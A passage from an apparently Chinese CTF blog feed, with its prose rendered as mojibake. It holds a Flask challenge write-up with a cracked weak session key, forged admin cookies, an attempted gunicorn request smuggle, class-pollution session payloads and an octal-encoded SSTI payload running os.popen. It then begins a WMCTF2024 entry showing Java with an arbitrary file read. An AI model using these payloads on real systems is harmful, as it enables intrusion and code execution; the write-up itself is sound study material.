punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> username <span class="token keyword">or</span> identity <span class="token operator">!=</span> <span class="token string">'admin'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'register'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    inventory_value <span class="token operator">=</span> sanitize_inventory_sold<span class="token punctuation">(</span>inventory<span class="token punctuation">)</span>    sold_value <span class="token operator">=</span> sanitize_inventory_sold<span class="token punctuation">(</span>sold<span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span><span class="token string">"å•†åº—åº“å­˜:"</span> <span class="token operator">+</span> inventory_value <span class="token operator">+</span> <span class="token string">"å·²å”®å‡º"</span> <span class="token operator">+</span> sold_value<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/admin/add_inventory'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add_inventory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> inventory    username <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span>    identity <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'identity'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> username <span class="token keyword">or</span> identity <span class="token operator">!=</span> <span class="token string">'admin'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'register'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'add'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        num <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'add'</span><span class="token punctuation">)</span>        inventory <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'admin.html'</span><span class="token punctuation">,</span> view<span class="token operator">=</span><span class="token string">'add_inventory'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">1337</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸€çœ¼åŸå‹é“¾æ±¡æŸ“ï¼Œé‚£ä¹ˆåªè¦æƒ³åŠæ³•ä¼ªé€ è¿›adminå°±è¡Œäº†</p><p>éšä¾¿æ³¨å†Œä¸ªç”¨æˆ·ï¼Œç„¶åå–sessionä¸‹æ¥è§£ä¸€ä¸‹çœ‹çœ‹</p><p><img src="/blog/2024/09/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E2%80%9C%E9%95%BF%E5%9F%8E%E6%9D%AF%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E6%9A%A8%E4%BA%AC%E6%B4%A5%E5%86%80%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B%EF%BC%88%E5%88%9D%E8%B5%9B%EF%BC%89/image-20240908104740351.png" alt="image-20240908104740351"></p><p>æ¥ä¸‹æ¥æƒ³åŠæ³•å¾—åˆ° SECRET_KEY ï¼Œä½†æ˜¯çœ‹äº†ä¸€åœˆæ²¡æ‰¾åˆ°æ˜æ˜¾å¯åˆ©ç”¨çš„ç‚¹</p><p>æ¥ä¸‹æ¥å°±æŠŠé‡ç‚¹æ”¾åœ¨ä¾èµ–ä¸Šé¢</p><p>å‘ç°ä¸€ä¸ªæœ‰æ„æ€çš„äº‹ï¼Œä¸ç®¡ç”¨æˆ·åæ€ä¹ˆå˜ï¼Œcsrf_tokenæ°¸è¿œä¸å˜ï¼Œè€Œcsrf_tokençš„ç”Ÿæˆåœ¨</p><p><img src="/blog/2024/09/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E2%80%9C%E9%95%BF%E5%9F%8E%E6%9D%AF%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E6%9A%A8%E4%BA%AC%E6%B4%A5%E5%86%80%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B%EF%BC%88%E5%88%9D%E8%B5%9B%EF%BC%89/image-20240908113612870.png" alt="image-20240908113612870"></p><p>ä¹Ÿå°±æ˜¯å’Œ session å…±ç”¨ä¸€ä¸ªsecret_key</p><p>ä½†æ˜¯ä¾æ—§æ²¡åŠæ³•è·å–key</p><p>æ³¨æ„åˆ°é¶æœºçš„ server æ˜¯ gunicorn&#x2F;20.0.4ï¼Œå°è¯•è¯·æ±‚èµ°ç§ï¼š</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/secret.txt</span> <span class="token http-version property">HTTP/1.1</span></span><span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">8.147.134.24:19525</span></span><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">412</span></span><span class="token header"><span class="token header-name keyword">Sec-Websocket-Key1</span><span class="token punctuation">:</span> <span class="token header-value">x</span></span>xxxxxxxxGET /secret.txt HTTP/1.1<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">8.147.134.24:19525</span></span><span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0</span></span><span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span></span><span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate, br</span></span><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span><span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ— äº‹å‘ç”Ÿã€‚ã€‚ã€‚å¯„</p><p>ä¸æ˜¯å“¥ä»¬ï¼Œ7ä½keyçœŸçˆ†ç ´å•ŠğŸ˜°ï¼Œç”Ÿæˆä¸€ä¸ª7ä½å­—å…¸ç„¶åflask_unsignæœ€åçˆ†ç ´å¾—åˆ°çš„keyä¸º a123456</p><p>ä¼ªé€ æˆadmin</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python flask_session_cookie_manager3.py encode <span class="token parameter variable">-s</span> <span class="token string">"a123456"</span> <span class="token parameter variable">-t</span> <span class="token string">"&#123;'csrf_token': '92cce9aeb377285f6daf96bd679fc01ec8207986', 'identity': 'admin', 'username': 'aaa'&#125;"</span>.eJwVy0EKgCAQAMC_7LmDGanbZ2JdV5DQQO0Q0d-z68A8wK3GvZ-HFNgANbMgiV-s1W6NJlBE44OxGFnNwk4ri87ABClI6anfY1HIqQy6mtRCWX4igvcDVj4c_g.ZuP7yg.dnVE6_9QjhdRbmm8DDia4g5dVIA<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>ç„¶åå°±èƒ½è¿›&#x2F;adminäº†ï¼Œæ¥ä¸‹æ¥å°±æ˜¯åŸå‹é“¾æ±¡æŸ“äº†</p><p>ç›´æ¥åœ¨ &#x2F;admin ä¿®æ”¹ session æ±¡æŸ“å…¨å±€å˜é‡sold</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python flask_session_cookie_manager3.py encode <span class="token parameter variable">-s</span> <span class="token string">"a123456"</span> <span class="token parameter variable">-t</span> <span class="token string">"&#123;'csrf_token': '92cce9aeb377285f6daf96bd679fc01ec8207986', 'identity': 'admin', 'username': 'aaa', '__init__':&#123;'__globals__':&#123;'sold':600&#125;&#125;&#125;"</span>.eJwly8sKwyAQheF3mXUXxlJvLyOjjkFqRoh2UYLvHkt35__gXBD7mf1ob2JwYGWMZJHCU2tpXlklzFaFpLTNUWwUjRTaGgUPKIl4lPFdL0xH4UWfTifjQT9CXOB94TK8B3etvdcWsPZ_9lYTOCXEnPMG7MwqbA.ZuP_Vw.RX77ZcM_hjJF_KxUBVPYkEIgLxM<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/09/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E2%80%9C%E9%95%BF%E5%9F%8E%E6%9D%AF%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E6%9A%A8%E4%BA%AC%E6%B4%A5%E5%86%80%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B%EF%BC%88%E5%88%9D%E8%B5%9B%EF%BC%89/image-20240913170211809.png" alt="image-20240913170211809"></p><p><strong>å…¶å®åˆ°è¿™é‡Œåº”è¯¥å¯ä»¥ç›´æ¥ç”¨ç»å…¸éé¢„æœŸ _static_folder æ±¡æŸ“æˆå¯¹åº”ä½ç½®ç›´æ¥æ‹¿flagäº†</strong></p><p>ç°åœ¨çœ‹ &#x2F;admin&#x2F;view_inventory</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/admin/view_inventory'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">view_inventory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    username <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span>    identity <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'identity'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> username <span class="token keyword">or</span> identity <span class="token operator">!=</span> <span class="token string">'admin'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'register'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    inventory_value <span class="token operator">=</span> sanitize_inventory_sold<span class="token punctuation">(</span>inventory<span class="token punctuation">)</span>    sold_value <span class="token operator">=</span> sanitize_inventory_sold<span class="token punctuation">(</span>sold<span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span><span class="token string">"å•†åº—åº“å­˜:"</span> <span class="token operator">+</span> inventory_value <span class="token operator">+</span> <span class="token string">"å·²å”®å‡º"</span> <span class="token operator">+</span> sold_value<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">sanitize_inventory_sold</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">r'[a-zA-Z_]'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ¸²æŸ“çš„å‚æ•°éƒ½æ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œè€Œè¿™é‡Œçš„<code>sanitize_inventory_sold</code>è¿‡æ»¤äº†å­—æ¯ï¼Œæ˜¯æ— å­—æ¯rce</p><p>ä¸è¿‡ flask å¯ä»¥ç›´æ¥ç”¨å…«è¿›åˆ¶ç»•è¿‡</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'__subclasses__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">133</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'__init__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'__globals__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'__import__("os").popen("calc").read()'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>\'\'<span class="token punctuation">[</span>\'\\<span class="token number">137</span>\\<span class="token number">137</span>\\<span class="token number">143</span>\\<span class="token number">154</span>\\<span class="token number">141</span>\\<span class="token number">163</span>\\<span class="token number">163</span>\\<span class="token number">137</span>\\<span class="token number">137</span>\'<span class="token punctuation">]</span><span class="token punctuation">[</span>\'\\<span class="token number">137</span>\\<span class="token number">137</span>\\<span class="token number">142</span>\\<span class="token number">141</span>\\<span class="token number">163</span>\\<span class="token number">145</span>\\<span class="token number">163</span>\\<span class="token number">137</span>\\<span class="token number">137</span>\'<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>\'\\<span class="token number">137</span>\\<span class="token number">137</span>\\<span class="token number">163</span>\\<span class="token number">165</span>\\<span class="token number">142</span>\\<span class="token number">143</span>\\<span class="token number">154</span>\\<span class="token number">141</span>\\<span class="token number">163</span>\\<span class="token number">163</span>\\<span class="token number">145</span>\\<span class="token number">163</span>\\<span class="token number">137</span>\\<span class="token number">137</span>\'<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">133</span><span class="token punctuation">]</span><span class="token punctuation">[</span>\'\\<span class="token number">137</span>\\<span class="token number">137</span>\\<span class="token number">151</span>\\<span class="token number">156</span>\\<span class="token number">151</span>\\<span class="token number">164</span>\\<span class="token number">137</span>\\<span class="token number">137</span>\'<span class="token punctuation">]</span><span class="token punctuation">[</span>\'\\<span class="token number">137</span>\\<span class="token number">137</span>\\<span class="token number">147</span>\\<span class="token number">154</span>\\<span class="token number">157</span>\\<span class="token number">142</span>\\<span class="token number">141</span>\\<span class="token number">154</span>\\<span class="token number">163</span>\\<span class="token number">137</span>\\<span class="token number">137</span>\'<span class="token punctuation">]</span><span class="token punctuation">[</span>\'\\<span class="token number">137</span>\\<span class="token number">137</span>\\<span class="token number">142</span>\\<span class="token number">165</span>\\<span class="token number">151</span>\\<span class="token number">154</span>\\<span class="token number">164</span>\\<span class="token number">151</span>\\<span class="token number">156</span>\\<span class="token number">163</span>\\<span class="token number">137</span>\\<span class="token number">137</span>\'<span class="token punctuation">]</span><span class="token punctuation">[</span>\'\\<span class="token number">145</span>\\<span class="token number">166</span>\\<span class="token number">141</span>\\<span class="token number">154</span>\'<span class="token punctuation">]</span><span class="token punctuation">(</span>\'\\<span class="token number">137</span>\\<span class="token number">137</span>\\<span class="token number">151</span>\\<span class="token number">155</span>\\<span class="token number">160</span>\\<span class="token number">157</span>\\<span class="token number">162</span>\\<span class="token number">164</span>\\<span class="token number">137</span>\\<span class="token number">137</span>\\<span class="token number">050</span>\\<span class="token number">042</span>\\<span class="token number">157</span>\\<span class="token number">163</span>\\<span class="token number">042</span>\\<span class="token number">051</span>\\<span class="token number">056</span>\\<span class="token number">160</span>\\<span class="token number">157</span>\\<span class="token number">160</span>\\<span class="token number">145</span>\\<span class="token number">156</span>\\<span class="token number">050</span>\\<span class="token number">042</span>\\<span class="token number">143</span>\\<span class="token number">141</span>\\<span class="token number">154</span>\\<span class="token number">143</span>\\<span class="token number">042</span>\\<span class="token number">051</span>\\<span class="token number">056</span>\\<span class="token number">162</span>\\<span class="token number">145</span>\\<span class="token number">141</span>\\<span class="token number">144</span>\\<span class="token number">050</span>\\<span class="token number">051</span>\'<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>ç»§ç»­åœ¨ &#x2F;admin ä¼ªé€ sessionæ±¡æŸ“</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">python flask_session_cookie_manager3<span class="token punctuation">.</span>py encode <span class="token operator">-</span>s <span class="token string">"a123456"</span> <span class="token operator">-</span>t <span class="token string">"&#123;'csrf_token': '92cce9aeb377285f6daf96bd679fc01ec8207986', 'identity': 'admin', 'username': 'aaa', '__init__':&#123;'__globals__':&#123;'inventory':'&#123;&#123;\'\'[\'\\137\\137\\143\\154\\141\\163\\163\\137\\137\'][\'\\137\\137\\142\\141\\163\\145\\163\\137\\137\'][0][\'\\137\\137\\163\\165\\142\\143\\154\\141\\163\\163\\145\\163\\137\\137\']()[133][\'\\137\\137\\151\\156\\151\\164\\137\\137\'][\'\\137\\137\\147\\154\\157\\142\\141\\154\\163\\137\\137\'][\'\\137\\137\\142\\165\\151\\154\\164\\151\\156\\163\\137\\137\'][\'\\145\\166\\141\\154\'](\'\\137\\137\\151\\155\\160\\157\\162\\164\\137\\137\\050\\042\\157\\163\\042\\051\\056\\160\\157\\160\\145\\156\\050\\042\\143\\141\\154\\143\\042\\051\\056\\162\\145\\141\\144\\050\\051\')&#125;&#125;'&#125;&#125;&#125;"</span><span class="token punctuation">.</span>eJyFkNFuhCAQRf<span class="token operator">-</span>FF7tJHxAY0P2VtSGo2JDuYqK2SWP49wVcarW2fZnAMOfeO8yoGYdOTv2btuiMStI0ulS6pkKQAjreqq7kdctF2TU4101BsCgLjp6RabWdzPTpKdXejPWt91EPVt10aCnlG1IaayYp0Xn259drX6vruFyN_fB8PwR<span class="token operator">-</span>nrPsklVVTkUqjPoCLJxyXzhN5TGSvewBspll8BPAe2ZRhS_6N88DsafTJad0LwiBA55OnP0VWCQ32OaPvf93jblhBdjG_4BftuCrjd_iKH4cwykXJ7tFqgqDf8UxBKRvjFccBPDivwrg5B0evrHxu9eN2ZEKSWycYywJQJ6dnEPOuTt3OcH8<span class="token punctuation">.</span>ZuQENw<span class="token punctuation">.</span>g6kUGTeAmtyztJGl3alH4O3wI_I<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>ç„¶åè®¿é—® &#x2F;admin&#x2F;view_inventory å³å¯rce</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;å‚è€ƒï¼š&lt;a href=&quot;https://mp.weixin.qq.com/s/26g_S3des0YHp3uAM29UqA&quot;&gt;https://mp.weixin.qq.com/s/26g_S3des0YHp3uAM29UqA&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="CTFçº¿ä¸Šèµ›" scheme="http://c1oudfl0w0.github.io/blog/categories/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
    
    
    <category term="ææƒ" scheme="http://c1oudfl0w0.github.io/blog/tags/%E6%8F%90%E6%9D%83/"/>
    
    <category term="Sql" scheme="http://c1oudfl0w0.github.io/blog/tags/Sql/"/>
    
  </entry>
  
  <entry>
    <title>WMCTF2024å¤ç°</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/09/07/WMCTF2024/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/09/07/WMCTF2024/</id>
    <published>2024-09-07T01:01:27.000Z</published>
    <updated>2024-09-13T16:49:49.686Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>è¿˜å¾—ç»ƒ</p><p>å‚è€ƒï¼š</p><p><a href="https://r3kapig-not1on.notion.site/WMCTF-2024-Writeup-by-r4kapig-57287aa7ffda4cd799339aa3b085393f#6fbbb8e3b6d7418989f7cba3186506e3">https://r3kapig-not1on.notion.site/WMCTF-2024-Writeup-by-r4kapig-57287aa7ffda4cd799339aa3b085393f#6fbbb8e3b6d7418989f7cba3186506e3</a></p><p><a href="https://blog.wm-team.cn/index.php/archives/80/#EzQl">https://blog.wm-team.cn/index.php/archives/80/#EzQl</a></p><span id="more"></span><hr><h1 id="jvm-go"><a href="#jvm-go" class="headerlink" title="jvm.go"></a>jvm.go</h1><p>çœ‹èµ·æ¥åƒæ˜¯æ‹¿goå®ç°äº†jvm</p><p>çœ‹äº†ä¸€çœ¼ Dockerfile æ‹‰çš„è¿˜æ˜¯javaçš„é•œåƒï¼Œä¸æ˜¯å¾ˆæ‡‚ï¼Œæ€»ä¹‹çœ‹ä¸€ä¸‹class</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>ctf</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">fi<span class="token punctuation">.</span>iki<span class="token punctuation">.</span>elonen<span class="token punctuation">.</span></span><span class="token class-name">NanoHTTPD</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">FileInputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">App</span> <span class="token keyword">extends</span> <span class="token class-name">NanoHTTPD</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">public</span> <span class="token class-name">App</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">super</span><span class="token punctuation">(</span><span class="token number">8080</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Running! Point your browsers to http://localhost:8080/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">protected</span> <span class="token keyword">boolean</span> <span class="token function">useGzipWhenAccepted</span><span class="token punctuation">(</span><span class="token class-name">NanoHTTPD<span class="token punctuation">.</span>Response</span> r<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">public</span> <span class="token class-name">NanoHTTPD<span class="token punctuation">.</span>Response</span> <span class="token function">serve</span><span class="token punctuation">(</span><span class="token class-name">NanoHTTPD<span class="token punctuation">.</span>IHTTPSession</span> session<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">></span></span> parms <span class="token operator">=</span> session<span class="token punctuation">.</span><span class="token function">getParms</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token class-name">String</span> page <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span>parms<span class="token punctuation">.</span><span class="token function">getOrDefault</span><span class="token punctuation">(</span><span class="token string">"page"</span><span class="token punctuation">,</span> <span class="token string">"index.html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>         <span class="token class-name">FileInputStream</span> fs <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>page<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> b <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span>fs<span class="token punctuation">.</span><span class="token function">available</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>         fs<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token class-name">String</span> text <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>         fs<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">return</span> page<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">newFixedLengthResponse</span><span class="token punctuation">(</span><span class="token string">"you know the rules and..."</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token function">newFixedLengthResponse</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> var7<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">return</span> <span class="token function">newFixedLengthResponse</span><span class="token punctuation">(</span><span class="token string">"page not found"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token 